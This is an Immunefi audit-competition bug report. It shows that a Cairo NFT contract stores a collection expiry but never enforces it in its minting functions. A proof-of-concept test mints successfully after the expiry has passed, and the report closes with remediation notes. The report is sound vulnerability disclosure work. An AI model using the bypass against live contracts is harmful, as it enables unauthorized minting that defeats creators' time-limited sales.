# 57201 sc low missing collection expiry enforcement

**Submitted on Oct 24th 2025 at 10:38:54 UTC by @OxPrince for** [**Audit Comp | Belong**](https://immunefi.com/audit-competition/audit-comp-belong)

* **Report ID:** #57201
* **Report Type:** Smart Contract
* **Report severity:** Low
* **Target:** <https://github.com/immunefi-team/audit-comp-belong/blob/feat/cairo/src/nft/nft.cairohttps://github.com/immunefi-team/audit-comp-belong/blob/feat/cairo/src/nft/nft.cairo>
* **Impacts:**
  * Unauthorized minting of NFTs

## Description

### Brief/Intro

* The NFT contract persists the `collection_expires` timestamp during initialization (`src/nft/nft.cairo:140-147`) and exposes it through the public `nftParameters` getter (`src/nft/nft.cairo:181-183`), signalling to integrators that the collection has an on-chain expiry.
* Neither minting path (`mintDynamicPrice` / `mintStaticPrice`) nor their internal helpers ever read this field (`src/nft/nft.cairo:254-347`); there is also no alternate entry point that enforces the deadline.
* As a result, any caller that obtained a valid mint signature before the advertised deadline can continue minting indefinitely after the sale should have closed, up to `max_total_supply`. This contradicts the intended lifecycle and misleads downstream integrations that rely on the expiry field.

### Vulnerability Details

`collection_expires` is written to storage when the factory initializes a collection (`src/nft/nft.cairo:140-147`) and recorded in the factory flow as part of `NftParameters` (`src/nftfactory/nftfactory.cairo:304-334`).

* The minting helpers `_mint_dynamic_price_batch` and `_mint_static_price_batch` only validate signatures, payment tokens, and prices before minting (`src/nft/nft.cairo:254-347`). They never consult `collection_expires`, nor is there any timestamp verification elsewhere in the contract.
* Tests assert that `collection_expires` is returned from `nftParameters()` (`src/tests/test_nft.cairo:189-207`), reinforcing that the expiry is expected to be meaningful, yet no behavioural test exercises an expiry guard.

### Impact Details

A buyer who received a valid pre-signed mint authorization (static or dynamic price) can wait until after the expected deadline and continue minting tokens as long as supply remains. This extends sales windows, defeats time-limited scarcity, and can lead to unexpected revenue splits or regulatory exposure for creators relying on time-boxed raises.

* Because the expiry is stored on-chain and surfaced in the ABI, integrators are likely to treat it as authoritative.

## References

Add any relevant links to documentation or code

## Proof of Concept

The following PoC demonstrates a test that creates a collection with an expiry, waits past that expiry, and successfully mints using a pre-signed static-price authorization — showing expiry is not enforced.

<details>

<summary>test_mintStaticPrice_after_expiry_poc (Rust test + helper)</summary>

```rust
fn deploy_factory_nft_receiver_erc20(
    signer: ContractAddress, is_referral: bool, transferrable: bool,
) -> (ContractAddress, ContractAddress, ContractAddress, ContractAddress) {
    deploy_factory_nft_receiver_erc20_with_expiry(
        signer, is_referral, transferrable, constants::EXPIRES(),
    )
}

fn deploy_factory_nft_receiver_erc20_with_expiry(
    signer: ContractAddress,
    is_referral: bool,
    transferrable: bool,
    collection_expires: u256,
) -> (ContractAddress, ContractAddress, ContractAddress, ContractAddress) {
    let factory_class = declare("NFTFactory").unwrap().contract_class();
    let nft_class = declare("NFT").unwrap().contract_class();
    let receiver_class = declare("Receiver").unwrap().contract_class();
    let erc20mock_class = declare("ERC20Mock").unwrap().contract_class();

    let (erc20mock, _) = erc20mock_class.deploy(@array![]).unwrap();

    let mut calldata = array![];
    calldata.append_serde(constants::OWNER());
    let (factory, _) = factory_class.deploy(@calldata).unwrap();

    let nft_factory = INFTFactoryDispatcher { contract_address: factory };

    let factory_parameters = FactoryParameters {
        signer,
        default_payment_currency: constants::CURRENCY(),
        platform_address: constants::PLATFORM(),
        platform_commission: 1000,
        max_array_size: 2,
    };

    let percentages = array![0, 5000, 3000, 1500, 500].span();

    start_cheat_caller_address(factory, constants::OWNER());
    nft_factory
        .initialize(
            *nft_class.class_hash, *receiver_class.class_hash, factory_parameters, percentages,
        );

    start_cheat_caller_address(factory, constants::REFERRAL());
    let referral = if is_referral {
        nft_factory.createReferralCode()
    } else {
        ''
    };

    let royalty_fraction = if is_referral {
        constants::FRACTION()
    } else {
        0
    };

    let produce_hash = ProduceHash {
        name_hash: constants::NAME().hash(),
        symbol_hash: constants::SYMBOL().hash(),
        contract_uri: constants::CONTRACT_URI().hash(),
        royalty_fraction,
    };
    start_cheat_caller_address_global(signer);

    let signature = sign_message(produce_hash.get_message_hash(factory));

    let instance_info = InstanceInfo {
        name: constants::NAME(),
        symbol: constants::SYMBOL(),
        contract_uri: constants::CONTRACT_URI(),
        payment_token: erc20mock,
        royalty_fraction,
        transferrable,
        max_total_supply: constants::MAX_TOTAL_SUPPLY(),
        mint_price: constants::MINT_PRICE(),
        whitelisted_mint_price: constants::WL_MINT_PRICE(),
        collection_expires,
        referral_code: referral,
        signature,
    };

    stop_cheat_caller_address_global();
    start_cheat_caller_address(factory, constants::CREATOR());

    let (nft, receiver) = nft_factory.produce(instance_info.clone());

    start_cheat_caller_address(erc20mock, signer);
    IERC20MintableDispatcher { contract_address: erc20mock }.mint(signer, 100000000);
    IERC20Dispatcher { contract_address: erc20mock }.approve(nft, 100000000);

    (factory, nft, receiver, erc20mock)
}




#[test]
fn test_mintStaticPrice_after_expiry_poc() {
    let signer = deploy_account_mock();
    let expiry: u256 = 5;
    let (_, nft_address, _, erc20mock) = deploy_factory_nft_receiver_erc20_with_expiry(
        signer, false, true, expiry,
    );
    let nft = INFTDispatcher { contract_address: nft_address };
    let erc20 = IERC20Dispatcher { contract_address: erc20mock };

    assert_eq!(nft.nftParameters().collection_expires, expiry);

    let receiver = signer;
    let token_id: u256 = 11;
    let whitelisted = false;
    let token_uri = constants::TOKEN_URI();

    let static_price_hash = StaticPriceHash {
        receiver, token_id: token_id, whitelisted, token_uri,
    };
    start_cheat_caller_address_global(signer);
    let signature: Span<felt252> = sign_message(static_price_hash.get_message_hash(nft_address)).into();
    stop_cheat_caller_address_global();

    set_block_timestamp(6_u64);

    let static_params = StaticPriceParameters {
        receiver, token_id, whitelisted, token_uri, signature,
    };
    let mut static_params_array = array![static_params];

    let signer_balance_before = erc20.balance_of(signer);

    start_cheat_caller_address(nft_address, signer);
    nft.mintStaticPrice(static_params_array, erc20mock, constants::MINT_PRICE());
    stop_cheat_caller_address(nft_address);

    let signer_balance_after = erc20.balance_of(signer);

    assert_eq!(signer_balance_before - constants::MINT_PRICE(), signer_balance_after);
    assert_eq!(nft.totalSupply(), 1);
    assert_eq!(ERC721ABIDispatcher { contract_address: nft_address }.owner_of(token_id), signer);
}
```

</details>

***

Notes for remediation (not exhaustive):

* Enforce `collection_expires` in the minting paths by comparing current block timestamp to the stored expiry before accepting a signed mint.
* Ensure both single and batch mint helpers consult the expiry.
* Consider adding tests that assert minting fails after expiry for both static and dynamic flows.
